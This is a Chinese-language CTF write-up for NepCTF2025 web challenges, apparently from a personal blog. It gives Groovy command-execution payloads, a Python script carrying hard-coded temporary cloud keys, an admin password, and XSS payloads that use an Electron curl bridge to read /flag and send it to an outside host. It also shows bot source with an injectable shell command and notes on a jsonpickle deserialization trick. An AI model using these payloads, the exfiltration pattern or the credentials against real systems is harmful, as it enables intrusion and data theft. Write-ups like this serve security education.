                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">NepCTF2025 WP</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/redefine-avatar.svg">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">xiaolaisec</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-08-07 12:30:05</span>
        <span class="mobile">2025-08-07 12:30:05</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-08-19 00:04:37</span>
            <span class="mobile">2025-08-19 00:04:37</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/CTF/">CTF</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/JAVA/">JAVA</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/PHP/">PHP</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/Python/">Python</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a><strong>WEB</strong></h1><h2 id="GooGooVVVY"><a href="#GooGooVVVY" class="headerlink" title="GooGooVVVY"></a><strong>GooGooVVVY</strong></h2><p>当时Rev有两过滤器都更新了，但是第一个过滤器完全没更换</p>
<p>Easy级别，没什么好说的，就一层简单的过滤为groovy中字符串命令执行的特性,属于是送分，就看谁运气好先开出靶机。</p>
<p>然后RevGroovy一起写，两者其实没区别了。本身是为了考察Groovy整个解析到调用的理解程度，Groovy解析你的payload会经过如下步骤：</p>
<ol>
<li>初始化：打开源文件并配置环境；</li>
<li>解析：语法用于生成代表源代码的令牌树；</li>
<li>转换：从标记树创建AST；</li>
<li>语义分析：执行语法无法检查的一致性和有效性检查，并解析类；</li>
<li>规范化：完成 AST 的构建；</li>
<li>指令选择：选择指令集；</li>
<li>类生成：在内存中创建 的字节码；</li>
<li>输出：将二进制输出写入文件系统；</li>
<li>完成：执行任何最后的清理；</li>
</ol>
<p>当时的设计思路是在具有代码执行风险的阶段都进行了较为严格的过滤。不过有一个阶段我留了一个不是很严格的口子，师傅们通过审计应该能看出来（不过我猜应该也没多少人看），然后就可以根据该阶段进行payload的编写。。。。。</p>
<p>但是rev不出网，且初版的回显内容只有一行，调用栈到底在哪出错了我完全没有写，为了降低难度甚至还贴心的构造了一个晚上的回显代码，让师傅们的执行结果都往去年的某一个系统的CVE中Groovy表达式执行的回显去靠，更贴近实战，因为实战中的groovy执行可能大部分都是没有回显的，需要师傅们自己去构造回显，不过这事我帮师傅们做了，哎，被资本做局了，当时构造完头昏了没换waf</p>
<p>具体的waf已经给了，只不过第一份没啥用了，第二层waf也给了，但是由于第一层完全没有限制那个最关键的点，导致第二层就失效了，没什么讲解的必要。</p>
<p>那这边就分享一下回显构造吧,具体获取调用栈的逻辑如下,然后就可以结合包裹代码执行的结果，再打印出来就能够看到回显了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public static String getStackTraceAsString(Throwable throwable) &#123;</span><br><span class="line">    try (StringWriter sw = new StringWriter();</span><br><span class="line">         PrintWriter pw = new PrintWriter(sw)) &#123;</span><br><span class="line"></span><br><span class="line">        throwable.printStackTrace(pw);</span><br><span class="line">        pw.flush();</span><br><span class="line">        return sw.toString();</span><br><span class="line">    &#125; catch (Exception ioEx) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后是groovy的过滤器构造,每一个groovy执行之前都要配置一个config，他有一个API叫做addCompilationCustomizers，能够满足我们在任意解析阶段添加过滤器，具体的构造样例如下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CompilerConfiguration config = new CompilerConfiguration();</span><br><span class="line">config.addCompilationCustomizers(securityCustomizer,new Phase3Purifiler());</span><br><span class="line"></span><br><span class="line">过滤器必须继承自 CompilationCustomizer ，且无参构造方法中必须带上自己属于的阶段，然后传入父类构造器：</span><br><span class="line">public class Phase3Purifiler extends CompilationCustomizer </span><br><span class="line"></span><br><span class="line">public Phase3Purifiler() &#123;</span><br><span class="line">    super(CompilePhase.CONVERSION);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7826" >https://xz.aliyun.com/news/7826 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2474849" >https://cloud.tencent.com/developer/article/2474849 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/111134369" >https://blog.csdn.net/zy15667076526/article/details/111134369 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>EXP：</p>
<p>def cmd &#x3D; “env”;</p>
<p>“${cmd.execute().text}”;</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="file:///C:\Users\27284\AppData\Local\Temp\ksohtml33608\wps2.jpg"
                      alt="img"
                ></p>
<p>EXP：</p>
<p>java.lang.Math.class.forName(“java.lang.Runtime”).getRuntime().exec(“env”).getText()</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="file:///C:\Users\27284\AppData\Local\Temp\ksohtml33608\wps4.jpg"
                      alt="img"
                ></p>
<h2 id="fakeXSS"><a href="#fakeXSS" class="headerlink" title="fakeXSS"></a><strong>fakeXSS</strong></h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首页注册用户-&gt;登录-&gt;传头像接口获取cos的临时的上传aksk-&gt;访问并列出存储桶-&gt;下载服务端源码server_bak.js</span><br><span class="line">-&gt;拿到管理员账号密码，可以修改首页背景图片-&gt;分析漏洞点在背景图片的代码，直接url拼接打XSS</span><br><span class="line">-&gt;/api/set-login-bg接口设置payload-&gt;服务端bot使用客户端软件访问首页，客户端用electron框架，并注入了electronAPI</span><br><span class="line">-&gt;electronAPI有curl函数可调用curl file协议读/flag</span><br></pre></td></tr></table></figure></div>

<p>先注册一个用户登录，上传头像接口处可以获得一组cos的临时的上传aksk</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgTHiaoCMxOCeno4G6t2q3DpvvhcMHicoyC8iaY8qGjlobB0uArnBeqib71g/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>测试该AKSK的权限，可以发现有列桶的权限</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> qcloud_cos <span class="keyword">import</span> CosConfig</span><br><span class="line"><span class="keyword">from</span> qcloud_cos <span class="keyword">import</span> CosS3Client</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用临时密钥获取存储桶信息</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_bucket_info</span>(<span class="params">region, bucket, secret_id, secret_key, token</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用临时密钥获取存储桶信息</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 配置COS客户端</span></span><br><span class="line">        config = CosConfig(</span><br><span class="line">            Region=region,</span><br><span class="line">            SecretId=secret_id,</span><br><span class="line">            SecretKey=secret_key,</span><br><span class="line">            Token=token,</span><br><span class="line">            Scheme=<span class="string">&#x27;https&#x27;</span></span><br><span class="line">        )</span><br><span class="line">        client = CosS3Client(config)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取存储桶信息</span></span><br><span class="line">        response = client.list_objects(Bucket=bucket)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 打印存储桶信息</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;存储桶 <span class="subst">&#123;bucket&#125;</span> 信息获取成功:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 打印前对象</span></span><br><span class="line">        <span class="keyword">if</span><span class="string">&#x27;Contents&#x27;</span><span class="keyword">in</span> response:</span><br><span class="line">            <span class="keyword">for</span> i, obj <span class="keyword">in</span> <span class="built_in">enumerate</span>(response[<span class="string">&#x27;Contents&#x27;</span>]):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>. <span class="subst">&#123;obj[<span class="string">&#x27;Key&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;获取存储桶信息时发生异常: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        returnNone</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 输入存储桶信息</span></span><br><span class="line">    REGION = <span class="string">&quot;ap-guangzhou&quot;</span></span><br><span class="line">    BUCKET = <span class="string">&quot;test-1360802834&quot;</span></span><br><span class="line">    </span><br><span class="line">    SECRET_ID = <span class="string">&quot;AKID9zMxupjx-lb3N4ew3HFlEoUuLbw6PfzWlJwlohod5utGR8YPMk0BzFc52_i_c7GJ&quot;</span></span><br><span class="line">    SECRET_KEY = <span class="string">&quot;a1mB43BS4VNOUx4qdWSZcLw6MTCsmflnu1VjVIAQjdU=&quot;</span></span><br><span class="line">    TOKEN = <span class="string">&quot;0TiYj7xc2u1d126cihcnHaKUjpRmygCa4110e1bc77e4c6cf6b645ec9100602390NgBtUSdkbd2I2a5Pme0s8bTqHTFJP-by2EO8Jjp1Eo6y8N1-yNztj7rCQTf2YhKirVFbmYPedQCT8ZtcsWP8yekf-w4WgwcfVcy3nsoNUKC37YT9_hllr2BN2wfaModBPDSAZuQ_MTzjsiHb2qQOj_e6Fd0LckMhLK_x5e-aSU42p_QU8FwSDf3u5M8XBZSYx_iCIRVV0Ji5LSLsiqjnEoH3HSGZZuzcIaeNy2OhqbjNM10QM-hNrUxE3wCovGONgt8BV96__DwgSZefQNW0cOVVQLIsdIKm2wXVz_9kcjNoxGH01Rh8reFzUeBitqqW7KcH7DNCMwIC5O7WcfjIitTHOrmIy9dsx21YZbEeISdQkShKFcATe2o4WWu0sdTkeQpsZ3-ihQm46yetgA0Y8QOqc40SvbO3OdlhMMLw3Gkoy6VbLrTLpGVYn0_cp4Z7DdCZaQrUR0ehi7FOCXSwQ&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用临时密钥获取存储桶信息</span></span><br><span class="line">    get_bucket_info(REGION, BUCKET, SECRET_ID, SECRET_KEY, TOKEN)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgUE4nVbM4OyVptibx1mpJ6A5tQ1jPfPRibaianTxZt7hIMPS8EzJLDriciaQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>flag.txt是一个假flag，为了提醒选手们去拿下面的源码的 可以在桶中找到server_bak.js，访问<a class="link"   target="_blank" rel="noopener" href="https://test-1360802834.cos.ap-guangzhou.myqcloud.com/www/server_bak.js%EF%BC%8C%E8%8E%B7%E5%BE%97%E6%BA%90%E7%A0%81" >https://test-1360802834.cos.ap-guangzhou.myqcloud.com/www/server_bak.js，获得源码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 源码中有admin的密码，nepn3pctf-game2025 登录admin 发现这里iframe的URL直接做拼接，是有xss的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgq9ia6b7NOmxk4xEzzZh4ygEMVuNKtSjd0VxkA4ocqg57JJsg48aicNKg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>loginBgUrl是通过admin访问&#x2F;api&#x2F;set-login-bg接口来设置的 alert的payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uploads/1f1eb21d-a0c9-441a-941b-c37498c3bcb8/微信图片_2025-07-16_112547_870.jpg?a=1\&quot; onload=\&quot;alert(2);</span><br></pre></td></tr></table></figure></div>

<p>注意要先上传再基于获得的云URL来写payload，因为设置之前会先检测内容是否存在 尝试外带bot的访问，可以发现没有东西 源码注释说bot会使用客户端访问，下载客户端，看看有无注入</p>
<p>jsbridge 列出window下的属性，可以发现客户端注入了electronAPI</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgKtp5kzS5VolenJqIgSZFoOKWluiajbZQmgl4iaWhNYiaCRYmva2NnbGsw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>其中有两个函数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXghbkiaoib6l7BOWrveep0lsRh2zGtGHpXV1kzJicgHDibZH7pdibs7G0dqrg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>尝试使用curl函数去curl file协议，发现就是原生curl</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgUXiaOBpzRibVVuibp9eeQIxQ5lYYGSOOmexB5apFwSNuYiaUFqicoovz4AA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>那么我们让bot去外带我们的&#x2F;flag文件即可，payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uploads/1f1eb21d-a0c9-441a-941b-c37498c3bcb8/微信图片_2025-07-16_112547_870.jpg?a=1\&quot; onload=\&quot;window.electronAPI.curl(&#x27;file:///flag&#x27;).then(result =&gt; &#123;window.location.href=&#x27;https://mak4r1.com/xss.php?a=test&#x27;+result.data&#125;);</span><br></pre></td></tr></table></figure></div>

<p>访问&#x2F;api&#x2F;bot 服务器成功接收到请求</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgvib4Cn2bjeJDtPhkIlLf15utPMmwRCECHx63QT1G8oIoOEJcoa17GgA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>另一种不用出网的payload：让bot获取flag后登录admin把flag存到个人简介中</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uploads/f329a942-bd2e-4902-bc83-add5e4df0094/微信图片_2025-07-16_112547_870.jpg?a=1\&quot; onload=\&quot;window.electronAPI.curl(&#x27;file:///flag&#x27;).then(result =&gt; &#123; fetch(&#x27;/api/login&#x27;,&#123;method:&#x27;POST&#x27;,headers:&#123;&#x27;Content-Type&#x27;:&#x27;application/json&#x27;&#125;,credentials:&#x27;include&#x27;,body:JSON.stringify(&#123;username:&#x27;admin&#x27;,password:&#x27;nepn3pctf-game2025&#x27;&#125;)&#125;).then(()=&gt;fetch(&#x27;/api/save-bio&#x27;,&#123;method:&#x27;POST&#x27;,headers:&#123;&#x27;Content-Type&#x27;:&#x27;application/json&#x27;&#125;,credentials:&#x27;include&#x27;,body:JSON.stringify(&#123;bio:result.data&#125;)&#125;));&#125;);</span><br></pre></td></tr></table></figure></div>

<p>访问&#x2F;api&#x2F;user即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgjbsKDgwfpOz1PicoWxo0hNNd0ILQ4aFBicn24WyCYwegecQWbibLCibjjA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>iframe内部也可以上传html文件xss，但是electron的子页面不会和主页面共享api，所以只能走标签的xss 关于electronAPI的发现，通过对客户端内简单测试即可得到，当然最初本意是让大家逆一下客户端（解包看源码)的，看了源码就可以发现curl还可以命令拼接直接RCE。怎么做都可以</p>
<p>附上bot源码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">const &#123; app, BrowserWindow, ipcMain &#125; = require(&#x27;electron&#x27;);</span><br><span class="line">const path = require(&#x27;path&#x27;);</span><br><span class="line">const &#123; exec &#125; = require(&#x27;child_process&#x27;);</span><br><span class="line">let win = null;</span><br><span class="line">app.commandLine.appendSwitch(&#x27;no-sandbox&#x27;);      </span><br><span class="line">app.commandLine.appendSwitch(&#x27;disable-gpu&#x27;);     </span><br><span class="line">app.commandLine.appendSwitch(&#x27;headless&#x27;);      </span><br><span class="line">app.commandLine.appendSwitch(&#x27;disable-software-rasterizer&#x27;); </span><br><span class="line">app.commandLine.appendSwitch(&#x27;ignore-certificate-errors&#x27;);</span><br><span class="line">app.commandLine.appendSwitch(&#x27;allow-insecure-localhost&#x27;);</span><br><span class="line">function createBotWindow() &#123;</span><br><span class="line">  win = new BrowserWindow(&#123;</span><br><span class="line">    width: 1600,</span><br><span class="line">    height: 1200,</span><br><span class="line">    webPreferences: &#123;</span><br><span class="line">      preload: path.join(__dirname, &#x27;preload.js&#x27;),</span><br><span class="line">      sandbox: false,              </span><br><span class="line">      offscreen: true            </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">const targetURL = &#x27;https://nepctf32-ytbf-po7r-hdk7-2cscouczs393.nepctf.com/&#x27;;</span><br><span class="line">  win.loadURL(targetURL);</span><br><span class="line"></span><br><span class="line">  win.webContents.on(&#x27;ready-to-show&#x27;, () =&gt; &#123;</span><br><span class="line">    console.log(`visit success：$&#123;targetURL&#125;`);</span><br><span class="line">    console.log(`stay for 3 seconds and then exit ...`);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">      console.log(&#x27;exit!&#x27;);</span><br><span class="line">      app.quit();</span><br><span class="line">    &#125;, 3000);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  win.webContents.on(&#x27;did-fail-load&#x27;, (event, errorCode, errorDesc) =&gt; &#123;</span><br><span class="line">    console.error(`visit fail：$&#123;errorCode&#125; - $&#123;errorDesc&#125;`);</span><br><span class="line">    app.quit();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.whenReady().then(createBotWindow);</span><br><span class="line"></span><br><span class="line">ipcMain.handle(&#x27;load-remote-url&#x27;, async (event, url) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">if (mainWindow) &#123;</span><br><span class="line">    mainWindow.loadURL(url);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">ipcMain.handle(&#x27;curl&#x27;, async (event, url) =&gt; &#123;</span><br><span class="line">returnnewPromise((resolve) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    const cmd = `curl -L &quot;$&#123;url&#125;&quot;`;</span><br><span class="line"></span><br><span class="line">    exec(cmd, (error, stdout, stderr) =&gt; &#123;</span><br><span class="line">      if (error) &#123;</span><br><span class="line">        return resolve(&#123; success: false, error: error.message &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      resolve(&#123; success: true, data: stdout &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">const &#123; contextBridge, ipcRenderer &#125; = require(&#x27;electron&#x27;);</span><br><span class="line"></span><br><span class="line">contextBridge.exposeInMainWorld(&#x27;electronAPI&#x27;, &#123;</span><br><span class="line">loadRemoteURL: (url) =&gt; ipcRenderer.invoke(&#x27;load-remote-url&#x27;, url),</span><br><span class="line">curl : (url) =&gt; ipcRenderer.invoke(&#x27;curl&#x27;, url)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>

<h2 id="JavaSeri"><a href="#JavaSeri" class="headerlink" title="JavaSeri"></a><strong>JavaSeri</strong></h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="file:///C:\Users\27284\AppData\Local\Temp\ksohtml33608\wps7.jpg"
                      alt="img"
                ></p>
<p>一眼shiro框架</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="file:///C:\Users\27284\AppData\Local\Temp\ksohtml33608\wps8.jpg"
                      alt="img"
                > </p>
<p>出题人忘了删shiro的CB依赖。然后又发现忘了删自己测试的exp，本来是想让我们自己写链子</p>
<h2 id="safe-bank"><a href="#safe-bank" class="headerlink" title="safe_bank"></a><strong>safe_bank</strong></h2><p>该题源于研究强网杯决赛的ezlogin时发现的一个有趣的小trick，当然因为考虑不周，还是出现了一些非预期，红豆泥私密马赛。</p>
<p>说回题目，<code>jsonpickle</code>采用<code>Unpickler._restore</code>对序列化对象进行恢复。而每种标签又对应着不同的<code>_restore</code>函数。例如<code>py/object</code> ，会调用<code>_restore_object</code>进行处理。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgxic1nfV4ljoYNeKY6DpboYX36CL6qEfKXcCep4jhyY04tK3R46pBIcg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>而问题出在<code>jsonpickle</code>自定义的<code>loadclass</code>函数中。在208行对模块进行逆向翻译时，依次调用了<code>util.untranslate_module_name</code>-&gt;<code>util._0_9_6_compat_untranslate</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgGumUKPrOMj23uMZicBxWU6icJENNtlXdDH1nTMpW7CAssdI1RZHe16GA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>在<code>util._0_9_6_compat_untranslate</code>中，将<code>builtin</code>和<code>exceptions</code>转化为<code>builtins</code>。这恐怕是开发者为了兼容Python2，因为在Python2中，使用<code>__builtin__</code>代表内置模块，而非<code>builtins</code>，而<code>exceptions</code>是作为Python2中存放异常类的模块，Python3则将异常类全部放入了<code>builins</code>模块中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXg5xvpz5cxibLEgfaDBVmcxAEWOp4ntSmnRhLqvmUnS3ursfYJbBfoBgw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
